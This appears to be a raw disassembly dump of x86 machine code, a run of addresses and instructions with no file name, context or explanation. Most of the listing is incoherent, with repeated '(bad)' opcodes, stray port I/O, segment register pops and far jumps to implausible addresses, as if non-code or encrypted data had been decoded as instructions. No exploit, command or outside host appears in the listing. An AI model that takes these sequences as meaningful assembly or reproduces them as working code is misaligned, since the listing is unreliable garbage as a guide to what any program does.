  423c2b:	mov    ah,0xeb
  423c2d:	call   DWORD PTR [ecx+0x9892854]
  423c33:	sbb    esi,DWORD PTR [ebx]
  423c35:	mov    al,BYTE PTR [ebp+0x28]
  423c38:	dec    esp
  423c39:	je     0x423c55
  423c3b:	aam    0x94
  423c3d:	inc    edx
  423c3e:	shl    cl,0x85
  423c41:	xlat   BYTE PTR ds:[ebx]
	...
  423cb2:	add    BYTE PTR [eax],al
  423cb4:	mov    edi,0x626d60bd
  423cb9:	std    
  423cba:	mov    edi,0x703576ff
  423cbf:	enter  0xa018,0xf5
  423cc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423cc4:	push   esi
  423cc5:	jle    0x423cc8
  423cc7:	add    dh,dh
  423cc9:	add    BYTE PTR [eax],al
  423ccb:	add    BYTE PTR [ebx],cl
  423ccd:	icebp  
  423cce:	test   BYTE PTR [ebx-0x43eb776c],bl
  423cd4:	inc    ebp
  423cd5:	pop    ss
  423cd6:	or     ah,ah
  423cd8:	sahf   
  423cd9:	jecxz  0x423c78
  423cdb:	pop    es
  423cdc:	sub    DWORD PTR [eax-0x50ee90cd],ecx
  423ce2:	cdq    
  423ce3:	ss inc ecx
  423ce5:	push   ebp
  423ce6:	adc    esi,DWORD PTR [eax+0x45]
  423ce9:	sbb    esi,DWORD PTR ds:0xe2b4e8e7
  423cef:	test   al,0xfa
  423cf1:	inc    esi
  423cf2:	rol    BYTE PTR [ebp+0x20],cl
  423cf5:	js     0x423d65
  423cf7:	(bad)  
  423cf8:	cdq    
  423cf9:	dec    edx
  423cfa:	mov    DWORD PTR [eax+edx*1],0xee3c60a9
  423d01:	jmp    FWORD PTR [ecx+esi*4-0x2e]
  423d05:	push   edx
  423d06:	aaa    
  423d07:	fwait
  423d08:	mov    edi,0x58377fa3
  423d0d:	repz out dx,eax
  423d0f:	push   ds
  423d10:	push   ss
  423d11:	adc    DWORD PTR [ecx+0x5fe19cc9],ebp
  423d17:	test   eax,0xbb93e6c8
  423d1c:	dec    ebp
  423d1d:	and    BYTE PTR [edx+eax*8+0x326b973a],ah
  423d24:	jno    0x423d7c
  423d26:	jmp    0x911ec8c5
  423d2b:	inc    eax
  423d2c:	mov    ebp,0xaf91e5d1
  423d31:	push   eax
  423d32:	mov    BYTE PTR [ebp-0x52],ch
  423d35:	sar    esi,cl
  423d37:	fdivr  DWORD PTR ds:0x4a845a9d
  423d3d:	pop    edx
  423d3e:	(bad)  
  423d3f:	data16 repnz sub bh,BYTE PTR [eax+0x6d7bbf1e]
  423d47:	pop    esi
  423d48:	xor    dh,ah
  423d4a:	scas   eax,DWORD PTR es:[edi]
  423d4b:	ins    DWORD PTR es:[edi],dx
  423d4c:	in     eax,0x75
  423d4e:	sub    ch,BYTE PTR [ecx+edx*4]
  423d51:	mov    edx,0xa3e8bda9
  423d56:	xchg   edx,eax
  423d57:	push   esi
  423d58:	pop    ecx
  423d59:	and    BYTE PTR [edi],al
  423d5b:	xchg   edi,eax
  423d5c:	push   edx
  423d5d:	push   0x4e6b7007
  423d62:	arpl   WORD PTR [esi+0x1838161f],sp
  423d68:	or     esp,ebp
  423d6a:	bound  ecx,QWORD PTR [edx]
  423d6c:	fdivr  QWORD PTR ds:0xf8e3d4e9
  423d72:	and    eax,0x6bb60350
  423d77:	leave  
  423d78:	sbb    ah,BYTE PTR [ebp+0x56f96e5f]
  423d7e:	sub    DWORD PTR [edi-0x5fbd18c1],ebx
  423d84:	mov    bh,0x76
  423d86:	mov    cl,BYTE PTR [ebp+0x744873e1]
  423d8c:	dec    ebx
  423d8d:	mov    al,0xe1
  423d8f:	sahf   
  423d90:	arpl   WORD PTR [eax-0x6c5bfeed],bp
  423d96:	repnz adc dl,BYTE PTR [ebx+0x4c]
  423d9a:	cmp    eax,DWORD PTR [ebx+0x2]
  423d9d:	xchg   esp,eax
  423d9e:	cs into 
  423da0:	sub    al,0xb8
  423da2:	rcl    DWORD PTR [ebp+0xb2b4002],cl
  423da8:	test   BYTE PTR [esi+0x29a53ccf],cl
  423dae:	inc    eax
  423daf:	sbb    BYTE PTR [esi-0xf],bl
  423db2:	daa    
  423db3:	adc    esi,edx
  423db5:	in     al,0xc
  423db7:	mov    es,WORD PTR [esi-0x7]
  423dba:	xchg   esp,eax
  423dbb:	addr16 jp 0x423e07
  423dbe:	inc    ecx
  423dbf:	fwait
  423dc0:	test   cl,al
	...
  423e32:	add    BYTE PTR [eax],al
  423e34:	adc    DWORD PTR [ebp-0x78],0x19
  423e38:	(bad)  
  423e3a:	xchg   ebx,eax
  423e3b:	ffreep st(6)
  423e3d:	dec    eax
  423e3e:	imul   ebp,edi,0x6b
  423e41:	pusha  
  423e42:	mov    dh,0x61
  423e44:	dec    esp
  423e45:	jg     0x423e48
  423e47:	add    dh,dh
  423e49:	add    BYTE PTR [eax],al
  423e4b:	add    BYTE PTR [edi],bl
  423e4d:	retf   0xd888
  423e50:	cdq    
  423e51:	(bad)  
  423e52:	div    BYTE PTR ds:0x2807398d
  423e58:	mov    bh,0x4e
  423e5a:	xor    dl,BYTE PTR [esi-0x65]
  423e5d:	lea    edx,[eax+0x76]
  423e60:	arpl   bx,bp
  423e62:	js     0x423ed9
  423e64:	sbb    BYTE PTR [ebp*4+0xc2da2e4],al
  423e6b:	push   cs
  423e6c:	(bad)  
  423e6d:	leave  
  423e6e:	cli    
  423e6f:	sbb    esi,DWORD PTR ds:0xae4d93d4
  423e75:	inc    edi
  423e76:	leave  
  423e77:	(bad)  
  423e78:	in     eax,dx
  423e79:	outs   dx,DWORD PTR ds:[esi]
  423e7a:	icebp  
  423e7b:	mov    cl,0x1e
  423e7d:	or     BYTE PTR [ebx],ch
  423e7f:	enter  0x5cc0,0x10
  423e83:	cmp    al,0x4e
  423e85:	(bad)  
  423e86:	xor    al,0xac
  423e88:	push   0x36
  423e8a:	lock mov eax,ds:0xdc1f9ae1
  423e90:	pop    edi
  423e91:	stos   DWORD PTR es:[edi],eax
  423e92:	test   ebp,edx
  423e94:	xchg   edx,eax
  423e95:	adc    ebx,ecx
  423e97:	pop    ds
  423e98:	shl    BYTE PTR [ecx+0x7bd75914],1
  423e9e:	and    bh,BYTE PTR [ecx]
  423ea0:	add    BYTE PTR [ecx+eiz*4-0x60],bl
  423ea4:	bound  ecx,QWORD PTR gs:[ebx-0x53838e53]
  423eab:	mov    bl,0x1a
  423ead:	xor    eax,0x62491d89
  423eb2:	ret    0xd9ad
  423eb5:	jb     0x423f1f
  423eb7:	mov    edi,0xb67a8fff
  423ebc:	jl     0x423e65
  423ebe:	xor    BYTE PTR ss:[edi+edi*1+0x1d],dh
  423ec3:	mov    ch,0x8e
  423ec5:	cmc    
  423ec6:	sbb    ebx,DWORD PTR [ebp-0x47]
  423ec9:	int3   
  423eca:	rol    BYTE PTR [ebx+0xdde6167],cl
  423ed0:	mov    eax,ds:0x6f3de69a
  423ed5:	mov    dl,0x8c
  423ed7:	ror    dl,cl
  423ed9:	adc    eax,0x3fe2edfe
  423ede:	xchg   edi,eax
  423edf:	retf   
  423ee0:	sub    al,0xcd
  423ee2:	jmp    0x423f36
  423ee4:	mov    ch,0x26
  423ee6:	loopne 0x423ed1
  423ee8:	lea    esi,[edx]
  423eea:	gs loope 0x423eb9
  423eed:	mov    al,ds:0x3a9bc560
  423ef2:	mov    BYTE PTR [edi],dh
  423ef4:	sub    al,0x56
  423ef6:	sbb    ch,BYTE PTR [esp+ebp*1+0x407bb93d]
  423efd:	inc    ecx
  423efe:	inc    esp
  423eff:	xor    ch,al
  423f01:	rcl    edi,1
  423f03:	jnp    0x423f64
  423f05:	cmp    eax,0x2b903d49
  423f0a:	adc    dh,BYTE PTR [ecx]
  423f0c:	sbb    DWORD PTR [ebx+esi*1-0x50],ebx
  423f10:	lahf   
  423f11:	push   esp
  423f12:	je     0x423f65
  423f14:	fwait
  423f15:	sahf   
  423f16:	xor    DWORD PTR [ebx],0x30a8e93a
  423f1c:	and    eax,0x9d673ce1
  423f21:	mov    BYTE PTR [ebx],dl
  423f23:	inc    ecx
  423f24:	pusha  
  423f25:	mul    ah
  423f27:	push   cs
  423f28:	xor    ebx,ebx
  423f2a:	(bad)  
  423f2b:	dec    edx
  423f2c:	shr    BYTE PTR [esi+edx*4-0x6a],cl
  423f30:	lods   eax,DWORD PTR ds:[esi]
  423f31:	(bad)  
  423f32:	stc    
  423f33:	inc    eax
  423f34:	jno    0x423f91
  423f36:	jle    0x423ec9
  423f38:	scas   al,BYTE PTR es:[edi]
  423f39:	cmp    DWORD PTR [esi+eax*4-0x2b14df67],eax
  423f40:	adc    edi,DWORD PTR [eax+0x0]
	...
  423fb2:	add    BYTE PTR [eax],al
  423fb4:	inc    esi
  423fb5:	in     al,0x62
  423fb7:	mov    dl,ah
  423fb9:	mov    gs,esi
  423fbb:	out    dx,al
  423fbc:	in     al,dx
  423fbd:	pop    ebx
  423fbe:	test   BYTE PTR [edx+0x21],dh
  423fc1:	cmc    
  423fc2:	fwait
  423fc3:	(bad)  
  423fc4:	inc    edx
  423fc5:	add    BYTE PTR [ecx],0x0
  423fc8:	test   BYTE PTR [eax],0x0
  423fcb:	add    BYTE PTR [edx],ch
  423fcd:	inc    ebx
  423fce:	cmp    eax,0xe69167ee
  423fd3:	adc    DWORD PTR [ecx],esp
  423fd5:	jbe    0x423f98
  423fd7:	adc    eax,0xbf7f5eb
  423fdc:	or     DWORD PTR [esi],ebp
  423fde:	push   0x2053a35e
  423fe3:	nop
  423fe4:	sbb    al,0xb
  423fe6:	nop
  423fe7:	call   0x47a3:0xf988d26b
  423fee:	test   DWORD PTR [edi],ecx
  423ff0:	ja     0x423f97
  423ff2:	push   esp
  423ff3:	add    dh,BYTE PTR [edi*2+0x609ecbbc]
  423ffa:	mov    al,ds:0x80d0e881
  423fff:	cli    
  424000:	and    BYTE PTR [esi-0x3da0b2f4],cl
  424006:	(bad)  
  424007:	pop    ecx
  424008:	lahf   
  424009:	into   
  42400a:	pop    edx
  42400b:	xchg   esi,eax
  42400c:	leave  
  42400d:	xchg   ecx,eax
  42400e:	push   ebx
  42400f:	adc    DWORD PTR [eax-0x1914b724],eax
  424015:	icebp  
  424016:	pop    ebp
  424017:	stos   BYTE PTR es:[edi],al
  424018:	test   BYTE PTR [ebx],0x9c
  42401b:	lock ja 0x424063
  42401e:	push   ss
  42401f:	nop
  424020:	inc    esi
  424021:	and    ah,cl
  424023:	pop    edi
  424024:	aas    
  424025:	or     esi,0xd8070d57
  42402b:	jmp    0x42408f
  42402d:	cmc    
  42402e:	xchg   ebp,eax
  42402f:	daa    
  424030:	xchg   edx,eax
  424031:	mov    esi,DWORD PTR [edx-0x11]
  424034:	mov    edx,0x24272721
  424039:	out    0x78,al
  42403b:	inc    edi
  42403c:	enter  0xd0ee,0x87
  424040:	es mov ch,0xbb
  424043:	inc    edx
  424044:	lock sub eax,0x29d7b628
  42404a:	jp     0x424091
  42404c:	sub    edx,edi
  42404e:	pop    es
  42404f:	das    
  424050:	jne    0x423ffe
  424052:	add    dh,al
  424054:	and    al,0x3d
  424056:	loop   0x424082
  424058:	cmp    eax,0xe1eddb09
  42405d:	push   esp
  42405e:	xor    al,0xce
  424060:	sbb    edx,DWORD PTR [ecx-0xb759ce]
  424066:	imul   ebx,DWORD PTR [edi+eiz*4],0x79
  42406a:	cdq    
  42406b:	nop
  42406c:	stos   DWORD PTR es:[edi],eax
  42406d:	cmp    bh,BYTE PTR [ebp+ebx*4-0x1e]
  424071:	inc    eax
  424072:	or     DWORD PTR [edi+0x6182f3ea],esp
  424078:	dec    ecx
  424079:	repz loope 0x4240c9
  42407c:	pop    edi
  42407d:	jae    0x4240f6
  42407f:	fimul  DWORD PTR [esi-0x33627594]
  424085:	sbb    ebx,DWORD PTR [ebp+0x2a296a9b]
  42408b:	in     al,0xa1
  42408d:	mov    eax,eax
  42408f:	imul   eax,DWORD PTR [ebp+0xc3356e0],0xcbb18a71
  424099:	sahf   
  42409a:	test   BYTE PTR [esi+esi*8],bl
  42409d:	pop    ebp
  42409e:	jnp    0x4240cb
  4240a0:	daa    
  4240a1:	mov    dl,0xa6
  4240a3:	ds ret 0xf4bf
  4240a7:	mov    esi,0xd0c3b705
  4240ac:	add    BYTE PTR [ecx-0x5b],al
  4240af:	sub    al,BYTE PTR [ebx+0x4956f9a4]
  4240b5:	(bad)  
  4240b6:	xor    eax,0x4da97524
  4240bb:	push   cs
  4240bc:	leave  
  4240bd:	mov    eax,ds:0xa22ffaca
	...
  424132:	add    BYTE PTR [eax],al
  424134:	jns    0x424127
  424136:	div    DWORD PTR [ecx-0x6804801]
  42413c:	bound  esi,QWORD PTR [eax+0x773e7b6a]
  424142:	xor    eax,0x1813861
  424147:	add    dh,dh
  424149:	add    BYTE PTR [eax],al
  42414b:	add    dh,bl
  42414d:	cmp    al,0x82
  42414f:	test   al,0xae
  424151:	xor    bl,BYTE PTR [edi+0x487d288f]
  424157:	mov    ebx,esi
  424159:	in     al,dx
  42415a:	or     al,0xdc
  42415c:	sub    bl,cl
  42415e:	in     al,0x5b
  424160:	out    dx,al
  424161:	call   DWORD PTR [edx+0x4a98e88f]
  424167:	mov    ecx,DWORD PTR [edi]
  424169:	dec    ecx
  42416a:	int    0xec
  42416c:	ftst   
  42416e:	dec    esp
  42416f:	push   ds
  424170:	fisttp QWORD PTR [esi+0x71]
  424173:	or     bh,bl
  424175:	pop    edx
  424176:	xor    DWORD PTR [eax-0x2c8fdd49],esi
  42417c:	ja     0x424155
  42417e:	fldenv [eax-0x6bc9b110]
  424184:	add    al,0x11
  424186:	mov    ch,cl
  424188:	or     ebx,eax
  42418a:	or     eax,0x51a712c7
  42418f:	lods   eax,DWORD PTR ds:[esi]
  424190:	and    eax,0xa4094347
  424195:	pop    ss
  424196:	lea    esp,[edi]
  424198:	pop    edx
  424199:	cmp    DWORD PTR ds:0xa8462e97,ebx
  42419f:	xchg   edi,eax
  4241a0:	inc    esi
  4241a1:	fs leave 
  4241a3:	dec    esp
  4241a4:	aaa    
  4241a5:	pop    esi
  4241a6:	or     eax,0xe960f8ad
  4241ab:	add    eax,0x70c6e1c6
  4241b0:	test   eax,0x865f7d9a
  4241b5:	popa   
  4241b6:	xchg   esp,eax
  4241b7:	cmp    ebx,esp
  4241b9:	jae    0x424185
  4241bb:	mov    al,0xc8
  4241bd:	cmp    edx,esi
  4241bf:	push   ss
  4241c0:	mov    al,0xd7
  4241c2:	test   DWORD PTR [ebx],ebx
  4241c4:	and    al,0xe3
  4241c6:	out    0xd6,al
  4241c8:	shl    BYTE PTR [esi],1
  4241ca:	mov    bh,0x48
  4241cc:	push   esp
  4241cd:	ins    DWORD PTR es:[edi],dx
  4241ce:	pop    ds
  4241cf:	(bad)  
  4241d0:	push   0xffffff9c
  4241d2:	and    eax,0x75142eab
  4241d7:	xor    al,0xff
  4241d9:	fsubr  DWORD PTR [edx+0x74f5d2fb]
  4241df:	add    BYTE PTR [esi+0x4da8fedd],dl
  4241e5:	mov    dh,0xa8
  4241e7:	sti    
  4241e8:	sub    dl,BYTE PTR [edi+ebx*1-0xf]
  4241ec:	mov    eax,0x78abf470
  4241f1:	jp     0x424200
  4241f3:	xchg   ebp,eax
  4241f4:	xchg   ecx,eax
  4241f5:	mov    esi,0x69b3037d
  4241fa:	sbb    ebx,DWORD PTR [edx-0x60]
  4241fd:	sub    ecx,DWORD PTR [edx]
  4241ff:	inc    edi
  424200:	cli    
  424201:	cs push ss
  424203:	daa    
  424204:	sahf   
  424205:	jg     0x424238
  424207:	mov    al,0x6b
  424209:	pop    ebx
  42420a:	das    
  42420b:	loope  0x4241df
  42420d:	bound  edi,QWORD PTR [ecx+0x35]
  424210:	mov    dh,0xbb
  424212:	int    0x7b
  424214:	scas   al,BYTE PTR es:[edi]
  424215:	repz das 
  424217:	xchg   ebx,eax
  424218:	mov    DWORD PTR [edx],esi
  42421a:	mov    ebx,DWORD PTR [eax+0x3a2e5f1f]
  424220:	cmp    eax,0xcaef24f
  424225:	push   0xfffffffb
  424227:	arpl   WORD PTR [edi-0x224fba7],dx
  42422d:	pop    ebx
  42422e:	jg     0x4242a9
  424230:	xlat   BYTE PTR ds:[ebx]
  424231:	inc    DWORD PTR [edx+0x67]
  424234:	test   eax,0xa8f78b53
  424239:	js     0x424293
  42423b:	(bad)  
  42423c:	repz addr16 enter 0xeb89,0x4d
	...
  4242b2:	add    BYTE PTR [eax],al
  4242b4:	clc    
  4242b5:	fisub  WORD PTR [edx+0x30]
  4242b8:	mov    sp,0xdefa
  4242bc:	push   ss
  4242bd:	mov    ds:0x27bda4bf,eax
  4242c2:	xchg   DWORD PTR [ebx],ebp
  4242c4:	add    BYTE PTR cs:[ecx],0x0
  4242c8:	test   BYTE PTR [eax],0x0
  4242cb:	add    BYTE PTR [ebp+0x1536c24b],ch
  4242d1:	sub    eax,0xf2bca075
  4242d6:	(bad)  
  4242d7:	in     eax,dx
  4242d8:	add    BYTE PTR [ecx-0x6e],ch
  4242db:	sbb    edx,DWORD PTR [ebx-0x4a]
  4242de:	or     al,0x84
  4242e0:	push   edx
  4242e1:	pushf  
  4242e2:	ss dec esp
  4242e4:	inc    esi
  4242e5:	mov    edx,0xc1d7d6ea
  4242ea:	retf   
  4242eb:	mov    ecx,DWORD PTR es:[ecx-0x5a5f5c9]
  4242f2:	mov    esp,0xd3c96395
  4242f7:	mov    ds:0x7ccaa420,eax
  4242fc:	das    
  4242fd:	or     esp,DWORD PTR [edx+ebx*1-0x3e]
  424301:	aad    0x96
  424303:	xchg   edi,eax
  424304:	add    ah,cl
  424306:	jb     0x42435d
  424308:	stos   BYTE PTR es:[edi],al
  424309:	xchg   esp,edi
  42430b:	stos   BYTE PTR es:[edi],al
  42430c:	adc    esi,DWORD PTR [edi]
  42430e:	(bad)
  424311:	retf   
  424312:	add    ebp,ebp
  424314:	mov    bl,0x47
  424316:	add    eax,0xd6a5d645
  42431b:	add    ah,cl
  42431d:	jno    0x424313
  42431f:	sub    eax,0xe300d553
  424324:	inc    ecx
  424325:	shl    DWORD PTR [esi+ebx*1-0x2ea130c0],0xa8
  42432d:	lods   eax,DWORD PTR ds:[esi]
  42432e:	fldenv [eax]
  424330:	inc    esi
  424331:	dec    ebx
  424332:	xchg   ebp,eax
  424333:	bound  eax,QWORD PTR [ebp+0x5c44dce9]
  424339:	push   esi
  42433a:	test   ecx,esi
  42433c:	mov    ecx,0x30ed8f9c
  424341:	aas    
  424342:	cmp    ah,bl
  424344:	sub    BYTE PTR [eax+0x3ee6adda],al
  42434a:	cmp    ebp,DWORD PTR [ebp-0x36]
  42434d:	out    dx,eax
  42434e:	es mov ch,0x7a
  424351:	or     eax,0x818d34d6
  424356:	mov    WORD PTR [eax],ds
  424358:	pop    ecx
  424359:	pusha  
  42435a:	daa    
  42435b:	lock jmp 0x42432c
  42435e:	xor    esp,DWORD PTR [eax-0x61a2fcb8]
  424364:	pop    eax
  424365:	pop    ebp
  424366:	cmp    esp,DWORD PTR [ebx-0x24]
  424369:	(bad)  
  42436a:	in     al,0xda
  42436c:	out    0x4c,eax
  42436e:	push   0xffffffa7
  424370:	loope  0x424306
  424372:	push   ss
  424373:	jmp    0x9ea2fd8f
  424378:	mov    eax,ds:0xc50a3329
  42437d:	jnp    0x424321
  42437f:	push   ebp
  424380:	pop    ebp
  424381:	addr16 sub cl,dh
  424384:	cmp    eax,0xa3941e6d
  424389:	sub    esp,DWORD PTR [ecx+0x2d81f28b]
  42438f:	das    
  424390:	mov    edi,0x521c74e2
  424395:	(bad)  
  424396:	test   eax,0x3402d169
  42439b:	jl     0x424378
  42439d:	mov    ebx,0x29398df2
  4243a2:	inc    ebx
  4243a3:	in     eax,0x7a
  4243a5:	in     eax,dx
  4243a6:	mov    cl,0x8a
  4243a8:	repnz push ds
  4243aa:	fidivr DWORD PTR [eax]
  4243ac:	mov    cl,0x45
  4243ae:	adc    al,0xd
  4243b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4243b1:	mov    ah,0xa8
  4243b3:	sti    
  4243b4:	pop    ds
  4243b5:	jns    0x4243b5
  4243b7:	jb     0x42435c
  4243b9:	iret   
  4243ba:	pop    es
  4243bb:	outs   dx,BYTE PTR ds:[esi]
  4243bc:	push   es
  4243bd:	xchg   BYTE PTR [ebx+0x6f218c],ah
	...
  424433:	add    al,al
  424435:	mov    al,0x45
  424437:	outs   dx,DWORD PTR ds:[esi]
  424438:	jne    0x424439
  42443a:	jmp    0xd7d2:0x8abb70bf
  424441:	cmp    BYTE PTR [esi-0x19],bl
  424444:	and    al,0x83
  424446:	add    DWORD PTR [eax],eax
  424448:	test   BYTE PTR [eax],0x0
  42444b:	add    BYTE PTR [ebx],dh
  42444d:	(bad)  
  42444f:	sar    dh,cl
  424451:	pop    ebp
  424452:	shl    DWORD PTR [esi+0x5ab7b0c8],cl
  424458:	xchg   edi,eax
  424459:	dec    esp
  42445a:	lods   al,BYTE PTR ds:[esi]
  42445b:	xor    cl,al
  42445d:	and    ebx,edi
  42445f:	sahf   
  424460:	mov    eax,0x4e1eb186
  424465:	loopne 0x4243f0
  424467:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424468:	in     eax,dx
  424469:	xchg   BYTE PTR [ecx-0x5b],dh
  42446c:	add    al,0x15
  42446e:	xchg   esp,eax
  42446f:	add    edx,DWORD PTR [eax]
  424471:	jp     0x424412
  424473:	pushf  
  424474:	and    dh,bh
  424476:	arpl   WORD PTR [ebx-0x23],bx
  424479:	or     al,0x9e
  42447b:	mov    ebx,?
  42447d:	das    
  42447e:	mov    bl,BYTE PTR [edi-0x4512e55d]
  424484:	test   DWORD PTR [ecx+0x55d6ffe0],eax
  42448a:	mov    eax,ds:0xe98e89e8
  42448f:	aam    0x9f
  424491:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424492:	sar    BYTE PTR [ecx-0x67],cl
  424495:	cli    
  424496:	imul   DWORD PTR [ebp+ebp*2-0x76c9371a]
  42449d:	jge    0x4244c2
  42449f:	xchg   ecx,eax
  4244a0:	jle    0x42451a
  4244a2:	fcom   DWORD PTR [ecx]
  4244a4:	dec    eax
  4244a5:	push   ebp
  4244a6:	inc    ebx
  4244a7:	add    bh,BYTE PTR [ecx+0x2ceef0cc]
  4244ad:	jmp    0x64d8cf4f
  4244b2:	cmp    eax,ebx
  4244b4:	pushf  
  4244b5:	les    esp,FWORD PTR [esi-0x7cf8d66c]
  4244bb:	sbb    al,0xf
  4244bd:	(bad)  
  4244be:	(bad)  
  4244bf:	and    ebp,ebp
  4244c1:	xchg   BYTE PTR [edx],bh
  4244c3:	retf   
  4244c4:	in     eax,0xf6
  4244c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4244c7:	fimul  DWORD PTR [ebx+0x46]
  4244ca:	mov    edx,0xb1321550
  4244cf:	jmp    0x424462
  4244d1:	repz mov eax,0xfe9061c1
  4244d7:	mov    al,0x22
  4244d9:	out    dx,al
  4244da:	push   ecx
  4244db:	and    bh,BYTE PTR [eax-0x11f623c6]
  4244e1:	stos   DWORD PTR es:[edi],eax
  4244e2:	shl    BYTE PTR [ebx-0x65],1
  4244e5:	fcomi  st,st(4)
  4244e7:	mov    eax,0x96681fd3
  4244ec:	fisubr WORD PTR [edx+0x10e85b85]
  4244f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4244f3:	ret    
  4244f4:	inc    esp
  4244f5:	in     al,0xe9
  4244f7:	add    ch,BYTE PTR [ecx]
  4244f9:	sbb    DWORD PTR [ebp-0x4b83e4b4],edi
  4244ff:	mov    dh,0xb9
  424501:	sub    dl,bl
  424503:	(bad)  
  424504:	lods   al,BYTE PTR ds:[esi]
  424505:	in     al,0x40
  424507:	jnp    0x4244d3
  424509:	adc    eax,DWORD PTR [edx]
  42450b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42450c:	jmp    FWORD PTR [edx-0x1c9ee6e3]
  424512:	cmp    ecx,DWORD PTR [ecx+0x5db27c2b]
  424518:	jb     0x4244d7
  42451a:	lods   al,BYTE PTR ds:[esi]
  42451b:	mov    ah,0x48
  42451d:	jnp    0x4244fe
  42451f:	adc    al,0xcb
  424522:	mov    ebx,0xe29e373a
  424527:	(bad)  
  424528:	mul    DWORD PTR [ebx-0x40ed6794]
  42452e:	fidivr DWORD PTR [ecx+0x9201d95]
  424534:	fwait
  424535:	test   eax,0x64255566
  42453a:	cmovle eax,DWORD PTR [ebx]
  42453d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42453e:	dec    eax
  42453f:	ins    BYTE PTR es:[edi],dx
  424540:	pushf  
  424541:	mov    al,BYTE PTR [eax]
	...
  4245b3:	add    BYTE PTR [eax+0x7f747c8f],al
  4245b9:	test   DWORD PTR [eax+0x6c527eff],0x64f09d31
  4245c3:	push   0x1841a
  4245c8:	test   BYTE PTR [eax],0x0
  4245cb:	add    BYTE PTR [edx-0x2a],dl
  4245ce:	loop   0x424560
  4245d0:	scas   eax,DWORD PTR es:[edi]
  4245d1:	lods   eax,DWORD PTR ds:[esi]
  4245d2:	cmc    
  4245d3:	stc    
  4245d4:	add    BYTE PTR [ecx-0x1f],dl
  4245d7:	xor    eax,0xfc166432
  4245dc:	mov    ch,0xb2
  4245de:	rcl    DWORD PTR [eax-0x5c470e71],0xae
  4245e5:	add    esi,esi
  4245e7:	jg     0x4245f3
  4245e9:	scas   al,BYTE PTR es:[edi]
  4245ea:	cmp    al,0x14
  4245ec:	push   eax
  4245ed:	pop    edi
  4245ee:	push   cs
  4245ef:	jae    0x424649
  4245f1:	adc    al,0x5e
  4245f3:	int3   
  4245f4:	xchg   BYTE PTR [ebp-0x46],dl
  4245f7:	or     ebp,ebp
  4245f9:	xchg   edi,eax
  4245fa:	xor    cl,ah
  4245fc:	imul   ecx,edi,0xca5dfde
  424602:	ins    BYTE PTR es:[edi],dx
  424603:	sub    ecx,DWORD PTR [ebp+0x2e5af96f]
  424609:	das    
  42460a:	(bad)  
  42460b:	out    0xfe,al
  42460d:	xlat   BYTE PTR ds:[ebx]
  42460e:	sahf   
  42460f:	mov    al,0x70
  424611:	stc    
  424612:	sbb    bh,BYTE PTR [ebx-0x1]
  424615:	and    BYTE PTR [ebx+0x2765b29e],ah
  42461b:	pop    ss
  42461c:	inc    ebx
  42461d:	mov    ecx,0x6c8c69d0
  424622:	je     0x424609
  424624:	in     eax,0xdd
  424626:	push   0xffffffaa
  424628:	cmp    DWORD PTR [edx],edi
  42462a:	cs ja  0x42460e
  42462d:	pop    ebp
  42462e:	jle    0x4245ba
  424630:	add    al,0xc6
  424632:	add    cl,BYTE PTR [esi+ebx*4-0x79]
  424636:	push   cs
  424637:	inc    ebx
  424638:	add    DWORD PTR [edx],eax
  42463a:	lock push edx
  42463c:	xchg   ebx,eax
  42463d:	bound  ecx,QWORD PTR [ebp+0x23]
  424640:	mov    ds:0x4f3865f1,eax
  424645:	sub    al,0xc5
  424647:	dec    ecx
  424648:	addr16 (bad) 
  42464a:	xor    al,0xda
  42464c:	sbb    BYTE PTR [esi],0x5b
  42464f:	pop    ss
  424650:	inc    eax
  424651:	clc    
  424652:	gs and eax,0x71cb9dc0
  424658:	mov    ebx,0x625a0307
  42465d:	mov    ds:0xbc357ff8,eax
  424662:	ret    
  424663:	xor    eax,0x72ad5d9e
  424668:	xchg   esp,eax
  424669:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42466a:	sub    bh,BYTE PTR ss:[eax+0x2b]
  42466e:	pop    ds
  42466f:	aam    0x16
  424671:	lods   eax,DWORD PTR ds:[esi]
  424672:	cdq    
  424673:	inc    ebx
  424674:	cmc    
  424675:	xor    eax,0x55d6b9c0
  42467a:	push   ds
  42467b:	loop   0x424604
  42467d:	cmp    BYTE PTR ds:0x4497dcb9,ah
  424683:	push   edi
  424684:	mov    edx,0x10d5f3a8
  424689:	and    al,BYTE PTR [ecx+0x4fc60b4c]
  42468f:	pop    ebx
  424690:	je     0x424673
  424692:	loop   0x42468b
  424694:	cmp    BYTE PTR [ebx-0x4a68cae1],dl
  42469a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42469b:	std    
  42469c:	stc    
  42469d:	inc    ecx
  42469e:	sti    
  42469f:	nop    DWORD PTR [edx+0x46]
  4246a3:	add    bl,bl
  4246a5:	retf   0xeaf3
  4246a8:	in     al,dx
  4246a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4246aa:	dec    esi
  4246ab:	out    dx,al
  4246ac:	daa    
  4246ad:	imul   esp,DWORD PTR [edi-0xa],0x3541e55
  4246b4:	dec    ecx
  4246b5:	push   edi
  4246b6:	test   DWORD PTR [edx-0x1b],0x4ed71f71
  4246bd:	or     BYTE PTR [edi+0x956f26],al
	...
  424733:	add    BYTE PTR [ebx+eiz*1],dh
  424736:	jo     0x4246d5
  424738:	ja     0x424719
  42473a:	std    
  42473b:	stos   DWORD PTR es:[edi],eax
  42473c:	lods   eax,DWORD PTR ds:[esi]
  42473d:	and    ebp,esi
  42473f:	(bad)  
  424741:	inc    ebp
  424742:	or     eax,0x1851089
  424747:	add    dh,dh
  424749:	add    BYTE PTR [eax],al
  42474b:	add    BYTE PTR [edi],ch
  42474d:	mov    ch,0xba
  42474f:	fstp   TBYTE PTR [edx]
  424751:	test   eax,0x20fed42d
  424756:	ret    0xe0fe
  424759:	pop    esi
  42475a:	xor    BYTE PTR [edi+0x52c57141],al
  424760:	bnd jl 0x4246f0
  424763:	add    ah,dl
  424765:	fsub   QWORD PTR [edx-0x48f3d753]
  42476b:	les    edx,FWORD PTR [edx-0x360b1a12]
  424771:	ds push ecx
  424773:	loope  0x42478c
